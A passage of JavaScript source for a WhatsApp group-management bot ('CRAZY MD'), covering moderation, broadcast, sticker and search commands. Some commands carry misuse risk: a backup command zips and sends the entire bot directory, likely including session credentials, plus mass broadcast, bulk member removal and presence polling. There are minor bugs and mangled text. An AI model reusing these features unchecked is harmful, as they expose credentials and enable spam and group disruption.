                    XeonBotInc.public = true
                    replygcxeon(mess.done)
                } else if (q == 'self') {
                    XeonBotInc.public = false
                    replygcxeon(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!text) return replygcxeon(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcxeon(`Exif successfully changed to\n\nâ€¢ Packname : ${global.packname}\nâ€¢ Author : ${global.author}`)
                break
            case 'pp':
            case 'setpp':
            case 'fullpp':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return replygcxeon(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.updateBlockStatus(blockw, 'block').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replygcxeon(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.updateBlockStatus(blockww, 'unblock').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'leave':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!m.isGroup) return replygcxeon(mess.group)
                replygcxeon('Bye Everyone ðŸ¥º')
                await XeonBotInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replygcxeon(mess.owner)
                if (m.isGroup) return replygcxeon(mess.private)
                replygcxeon(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await XeonBotInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replygcxeon(mess.owner)
                if (!text) return replygcxeon(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await XeonBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcxeon(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nÊ™Ê€á´á´€á´…á´„á´€sá´›'
                    XeonBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://files.catbox.moe/cfqz6q.jpeg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcxeon(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isCreator) return replygcxeon(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("spacev1.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replygcxeon(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replygcxeon(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replygcxeon('sirThis message was not sent by a bot!')
                XeonBotInc.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcxeon(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replygcxeon(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcxeon(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcxeon(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
            case 'tagall': {
    if (!m.isGroup) return replygcxeon(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin);
    if (!isBotAdmins) return replygcxeon(mess.botAdmin);

    let teks = `┏━〔🌍 *TAG-ALL MEMBERS* 〕━┓\n\n`;
    teks += `📣 *Announcement:* ${q ? q : 'No message provided'}\n\n`;

    for (let mem of participants) {
        teks += `• @${mem.id.split('@')[0]}\n`;
    }

    teks += `\n┗━━━━━━━━━━━━━━━━━━┛`;

    XeonBotInc.sendMessage(m.chat, {
        text: teks,
        mentions: participants.map(a => a.id)
    }, { quoted: m });

    break;
}
case 'hidetag':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                XeonBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!m.quoted) return replygcxeon(`Reply messages with captions ${prefix + command}`)
                XeonBotInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
                
                case 'kickall':
    if (!m.isGroup) return replygcxeon(mess.group);
    if (!isGroupOwner && !isCreator) return replygcxeon('Only the group owner can use this command.');
    if (!isBotAdmins) return replygcxeon(mess.botAdmin);

    replygcxeon(`🚨 Deleting all group members...`);

    for (let participant of participants) {
        let id = participant.id;
        if (id !== botNumber && id !== m.sender && !groupMetadata.owner.includes(id)) {
            await XeonBotInc.groupParticipantsUpdate(m.chat, [id], 'remove')
                .catch(e => console.log(`Error excluding ${id}`));
            await sleep(1500); // délai pour éviter le bannissement de l'API
        }
    }

    replygcxeon('✅ All members have been kicked (except admins, owner, bot).');
    break;
    
    case 'promoteall':
    if (!m.isGroup) return replygcxeon(mess.group);
    if (!isGroupOwner && !isCreator) return replygcxeon('Only the group owner or bot creator can use this command.');
    if (!isBotAdmins) return replygcxeon(mess.botAdmin);

    replygcxeon(`🛠️ Promoting all group members to admin...`);

    for (let participant of participants) {
        const id = participant.id;

        // Skip bot and group owner
        if (id === botNumber || id === groupMetadata.owner) continue;

        try {
            await XeonBotInc.groupParticipantsUpdate(m.chat, [id], 'promote');
            await sleep(1200); // Delay to avoid rate limits
        } catch (err) {
            console.log(`Failed to promote ${id}:`, err);
        }
    }

    replygcxeon('✅ All group members have been promoted to admin.');
    break;
    
    case 'demoteall':
    if (!m.isGroup) return replygcxeon(mess.group);
    if (!isGroupOwner && !isCreator) return replygcxeon('Only the group owner or bot creator can use this command.');
    if (!isBotAdmins) return replygcxeon(mess.botAdmin);

    replygcxeon(`⚠️ Demoting all group admins...`);

    for (let participant of participants) {
        const id = participant.id;

        // Skip the group owner and bot itself
        if (id === botNumber || id === groupMetadata.owner) continue;

        // Check if member is currently an admin
        const isAdmin = groupMetadata.participants.find(p => p.id === id)?.admin;
        if (!isAdmin) continue;

        try {
            await XeonBotInc.groupParticipantsUpdate(m.chat, [id], 'demote');
            await sleep(1200); // Delay to prevent flood
        } catch (err) {
            console.log(`Failed to demote ${id}:`, err);
        }
    }

    replygcxeon('✅ All admins have been demoted (except bot and group owner).');
    break;
    
    case 'group':
    case 'grup':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcxeon(`Success In Closing The Group ✅`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcxeon(`Success In Opening The Group ✅`)).catch((err) => replygcxeon(json(err)))
                } else {
                    replygcxeon(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
                
                case 'listonline':
    if (!m.isGroup) return replygcxeon(mess.group);
    if (!isBotAdmins) return replygcxeon(mess.botAdmin);

    const onlineMembers = [];

    // Loop through group participants and check if they are online
    for (let participant of participants) {
        const id = participant.id;

        // Check if the participant is online
        const isOnline = await XeonBotInc.getStatus(id);

        if (isOnline.status === 'online') {
            onlineMembers.push(participant.id.split('@')[0]);
        }
    }

    // If no one is online, return a message
    if (onlineMembers.length === 0) {
        replygcxeon('No one is online in the group right now.');
        return;
    }

    // Prepare the message with online members
    let teks = `┏━〔👤 *Online Members* 〕━┓\n\n`;
    teks += `🔹 *Online Members*:\n`;
    onlineMembers.forEach(member => {
        teks += `• @${member}\n`;
    });
    teks += `\n┗━━━━━━━━━━━━━━━━┛`;

    // Send the list of online members
    XeonBotInc.sendMessage(m.chat, {
        text: teks,
        mentions: onlineMembers.map(id => `${id}@s.whatsapp.net`),
    }, { quoted: m });
    break;
/*    
    case 'tagadmin':
    if (!m.isGroup) return replygcxeon(mess.group);
    if (!isBotAdmins) return replygcxeon(mess.botAdmin);

    const admins = [];

    // Loop through group participants and check for admins
    for (let participant of participants) {
        const id = participant.id;
        
        // Check if the participant is an admin
        const isAdmin = groupMetadata.participants.find(p => p.id === id)?.admin;

        if (isAdmin) {
            admins.push(participant.id.split('@')[0]);  // Store admin's ID without '@c.us'
        }
    }

    // If no admins are found, send a message saying so
    if (admins.length === 0) {
        replygcxeon('There are no admins in this group.');
        return;
    }

    // Prepare the message with the list of admins
    let teks = `┏━〔👑 *Group Admins* 〕━┓\n\n`;
    teks += `🔹 *Admins in this group*:\n`;
    admins.forEach(admin => {
        teks += `• @${admin}\n`;
    });
    teks += `\n┗━━━━━━━━━━━━━━━━┛`;

    // Send the list of admins and tag them
    XeonBotInc.sendMessage(m.chat, {
        text: teks,
        mentions: admins.map(id => `${id}@s.whatsapp.net`),
    }, { quoted: m });
    break;
*/    
    case 'editinfo':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Group Edit Info ✅`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`Successfully Closed Group Edit Infᴏ✅`)).catch((err) => replygcxeon(json(err)))
                } else {
                    replygcxeon(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
                
                case 'infobot':
    if (!m.isGroup) return replygcxeon(mess.group);

    // Prepare the information to be displayed
    let botInfo = `┏━〔🤖 *Bot Information* 〕━┓\n\n`;
    botInfo += `🔹 *Bot Name:* CRAZY V2\n`;
    botInfo += `🔹 *Version:* 2.0.0\n`;
    botInfo += `🔹 *Creator:* Crazy\n`;
    botInfo += `🔹 *Features:* Tagging, Admin Management, Group Controls, Custom Responses, and more!\n`;
    botInfo += `🔹 *Contact:* wa.me/24105730123\n`;
    botInfo += `🔹 *Status:* Online and Active✅\n`;
    botInfo += `\n┗━━━━━━━━━━━━━━━━━━┛`;

    // Send the bot info as a message
    XeonBotInc.sendMessage(m.chat, {
        text: botInfo,
    }, { quoted: m });
    break;
    
case 'couplepp': {
    const apiUrl = 'https://apis.davidcyriltech.my.id/couplepp';

    try {
        const res = await fetch(apiUrl);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();

        const malePp = data.male;
        const femalePp = data.female;

        await XeonBotInc.sendMessage(m.chat, {
            image: { url: malePp },
            caption: '👦 *Male Profile Picture*'
        }, { quoted: m });

        await XeonBotInc.sendMessage(m.chat, {
            image: { url: femalePp },
            caption: '👧 *Female Profile Picture*'
        }, { quoted: m });

    } catch (error) {
        console.error('Error retrieving couplepp images:', error);
        XeonBotInc.sendMessage(m.chat, {
            text: '❌ An error occurred while retrieving images. Please try again later.'
        }, { quoted: m });
    }
}
break;

    case 'linkgroup':
    case 'grouplink':
    case 'linkgrup':
    case 'linkgc':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let response = await XeonBotInc.groupInviteCode(m.chat)
                XeonBotInc.sendText(m.chat, `💫 *𝐆𝐑𝐎𝐔𝐏 𝐈𝐍𝐅𝐎* 💫\n> *ɴᴀᴍᴇ :* ${groupMetadata.subject}\n> *ɢʀᴏᴜᴘ ᴏᴡɴᴇʀ :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n> *ᴜɪᴅ :* ${groupMetadata.id}\n> *LINK GC :* https://chat.whatsapp.com/${response}\n> *ᴍᴇᴍʙᴇʀs :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                await XeonBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcxeon(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replygcxeon(json(err)))
                break
                case 'ping':
                case 'speed': {
    const timestamp = speed(); // Assure-toi que 'speed()' est défini
    const pingMessage = `
╭━〔 🛰️ *CRAZY-PING* 🛰️ 〕━╮

🚀 *Status: Online and ready 🌩️*
⚡ *Speed:* *_${timestamp} ms📟_* 
🤖 *Bot Name:* CRAZY MD  
🌐 *Uptime:* ${runtime(process.uptime())}

╰━━━━━━━━━━━━━━━━━━━╯
`.trim();

    XeonBotInc.sendMessage(m.chat, {
        text: pingMessage,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: '⚡ Crazy MD - Always Fast!',
                body: 'Maintained by crazy dev 💻',
                thumbnailUrl: 'https://files.catbox.moe/cfqz6q.jpeg',
                sourceUrl: 'https://whatsapp.com/channel/0029VbANsvkIiRp31CEW3C2C',
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
}
break;

case 'alive':
    if (!m.isGroup) return replygcxeon(mess.group);

    // Define the audio file (replace with actual URL or path)
    const audio = { url: 'https://example.com/alive-audio.mp3' };

    // Send the audio along with external ad information
    XeonBotInc.sendMessage(m.chat, {
        audio: audio,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: '⚡ Crazy MD - Always Fast!',
                body: 'Maintained by Promise 💻',
                thumbnailUrl: 'https://files.catbox.moe/cfqz6q.jpeg',
                sourceUrl: 'https://whatsapp.com/channel/0029VbANsvkIiRp31CEW3C2C',
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
    break;
    
    case 'buypremium':
    case 'premium': {
    const premiumMessage = `
╭━[🌟 *PREMIUM-ACCESS* 🌟]━╮

> 🎉 *Unlock Premium Features for Free!*

✔️ *What you get with Premium:*
> - ⚡ Faster Bot Response Times
> - 🔒 Access to Exclusive Bots & Scripts
> - 🚀 Priority Updates and Support
> - 🎯 Exclusive Features Just for You!

💡 *It's completely FREE!*

👉 *To claim your FREE Premium Access, just click below!*

🔗 [Get Free Premium Access](https://whatsapp.com/channel/0029VbANsvkIiRp31CEW3C2C)

💖 *Enjoy the perks, and thanks for being a part of the community!*

╰━━━━━━━━━━━━━━━━━━━━╯
`;

    XeonBotInc.sendMessage(m.chat, {
        text: premiumMessage,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `✨ *Free Premium Access*`,
                body: `Get premium features for free, just follow the link!`,
                thumbnailUrl: 'https://files.catbox.moe/cfqz6q.jpeg', // Your thumbnail image
                sourceUrl: 'https://whatsapp.com/channel/0029VbANsvkIiRp31CEW3C2C', // Your link to claim premium
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
}
break;
case 'runtime': {
    const uptime = runtime(process.uptime());
    const runtimeMessage = `
╔═══[ 🤖 BOT STATUS ]═══╗

🟢 *Online:* Yes  
⏱️ *Uptime:* ${uptime}

> 💻 *Bot Name:* CrazyBot  
> 👤 *Maintainer:* Crazy Dev 
> 📡 Always active. Always improving.

╚═══════════════════╝
`.trim();

    XeonBotInc.sendMessage(m.chat, {
        text: runtimeMessage,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `⚡ CrazyBot is Running`,
                body: `🌩️ ᴄʀᴀᴢʏ ʀᴜɴᴛɪᴍᴇ 🌩️`,
                thumbnailUrl: 'https://files.catbox.moe/cfqz6q.jpeg',
                sourceUrl: global.link,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
}
break;

            case 'chnl':
            case 'channelsupport':
            case 'channellink': {
    XeonBotInc.sendMessage(m.chat, {
        text: `
╭━━━━━━━∘◦ ❀ ◦∘━━━━━━━╮
📢 *OFFICIAL CHANNEL ALERT*
╰━━━━━━━∘◦ ❀ ◦∘━━━━━━━╯

> ✨ Want the latest bot scripts, updates & tools?

👉 Join our WhatsApp Channel now!

🔗 *https://whatsapp.com/channel/0029VbANsvkIiRp31CEW3C2C*

💎 Stay connected with *CRAZY TECH* 
 
📦 Exclusive content • 💬 Community Support

🔔 Don't miss any updates!

> ❤️ Thank you for your support!
        `.trim(),
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `🚀 Get Premium Bot Tools Here!`,
                body: `Follow & Get Access Instantly 🔓`,
                thumbnailUrl: 'https://files.catbox.moe/cfqz6q.jpeg',
                sourceUrl: 'https://whatsapp.com/channel/0029VbANsvkIiRp31CEW3C2C',
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
}
break;

case 'donate':
case 'donasi': {
    const donateMsg = `
╔══ 🎁 *Donation Info* 🎁 ══╗

👋 Hello *${pushname}*,
No matter the amount, your support is deeply appreciated 💖

📲 *PalmPay (Gabon)*:
To donate, kindly DM *crazy* to receive the payment details (24105730123).

🤝 Every donation helps us maintain and upgrade the bot!

📣 _Thank you for supporting Crazy Dev & the Bot Community!_

╚═════════════════════╝
`;

    XeonBotInc.sendMessage(m.chat, {
        text: donateMsg
    }, { quoted: m });
}
break;

case 'devinfo':
case 'dev':
case 'developer': {
    let devText = `
┏━〔 👨‍💻 DEVELOPER INFO 〕━┓

🔹 *Name:* Crazy Dev  

💼 *Role:* Full Stack Developer  

🧠 *Skills:* JavaScript, Node.js, React, Firebase, MongoDB  

📦 *Specialty:* WhatsApp & Multi-Device Bot Developer  

📍 *Based In:* 🇬🇦 Gabon 

🔗 *Channel:* 
https://whatsapp.com/channel/0029VbANsvkIiRp31CEW3C2C

📝 Passionate about bots, automation & modern web apps.

┗━━━━━━━━━━━━━━━━━━━┛
    `.trim();

    XeonBotInc.sendMessage(m.chat, {
        text: devText,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: 'Crazy Dev - Full Stack Bot Developer',
                body: 'Follow my channel for powerful bots and updates!',
                thumbnailUrl: 'https://files.catbox.moe/cfqz6q.jpeg', // remplace par ton image de profil si besoin
                sourceUrl: 'https://whatsapp.com/channel/0029VbANsvkIiRp31CEW3C2C',
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
}
break;

case 'imgsearch':
case 'img': {
            await XeonBotInc.sendMessage(m.chat, { react: { text: "📷",key: m.key,}})
    if (!text) {
        return replygcxeon(`*Example:*\n${prefix + command} <number> <query>\nExample: ${prefix + command} 2 ferrari`);
    }

    // Split the input into number and query
    const [num, ...queryParts] = text.split(" ");
    const query = queryParts.join(" ");

    // Validate the number of images
    const numImages = parseInt(num);
    if (isNaN(numImages) || numImages < 1 || numImages > 10) {
        return replygcxeon(`Please choose a number between 1 and 10.\nExample: ${prefix + command} 2 ferrari`);
    }

    try {
        await XeonBotInc.sendMessage(m.chat, { react: { text: "🔎", key: m.key } });

        const apiResponse = await axios.get(`https://apis.davidcyriltech.my.id/googleimage`, {
            params: { query: query }
        });

        const { success, results } = apiResponse.data;

        if (!success || !results || results.length === 0) {
            return replygcxeon(`❌ No images found for "${query}". Try another search.`);
        }

        const maxImages = Math.min(results.length, numImages);
        for (let i = 0; i < maxImages; i++) {
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    image: { url: results[i] },
                    caption: `📷 *Image Search*\n🔎 *Query:* "${query}"\n📄 *Result:* ${i + 1}/${maxImages}`,
                    contextInfo: {
                        forwardingScore: 5,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "CRAZY TECH",
                            newsletterJid: "120363400129137847@newsletter",
                        },
                    },
                },
                { quoted: m }
            );
        }

        await XeonBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error("Error in Image Search:", error);
        replygcxeon(`❌ *Error fetching images. Try again later.*`);
    }
    break;
}

case 'owner': {
const repf = await XeonBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, ʜᴇʀᴇ ɪs ᴍʏ ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ 🎉\nᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʀᴀᴢʏ ᴛᴇᴄʜ`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replygcxeon(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replygcxeon(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replygcxeon(respond)
                if (!text) return replygcxeon(respond)
                replygcxeon(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await XeonBotInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
